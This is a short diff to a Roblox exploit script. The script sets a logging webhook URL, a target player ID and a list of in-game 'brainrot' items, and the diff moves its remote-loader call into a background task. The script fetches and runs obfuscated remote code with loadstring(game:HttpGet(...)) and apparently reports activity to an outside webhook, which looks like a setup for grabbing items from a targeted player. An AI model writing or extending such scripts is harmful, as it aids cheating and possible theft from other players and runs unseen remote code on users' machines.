@@ -1,4 +1,4 @@
--- 1. Define Settings FIRST (So scripts can read them instantly)
+-- 1. Define Settings FIRST
 getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_f3c631c272144b39bff34fa78896917e"
 getgenv().TARGET_ID = 7236992272 
 getgenv().DELAY_STEP = 1      
@@ -7,10 +7,12 @@ getgenv().TARGET_BRAINROTS = {
     ["Garama and Madundung"] = true
 }
 
--- 2. Execute the FIRST script
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0fbe1cfb1005a43bbfeb46cd458b7f09.lua"))()
+-- 2. Run the FIRST script in the background (task.spawn prevents it from blocking)
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0fbe1cfb1005a43bbfeb46cd458b7f09.lua"))()
+end)
 
--- 3. Wait exactly 1 second
+-- 3. Wait exactly 1 second for the first script to initialize
 task.wait(1)
 
 -- 4. Execute the SECOND script
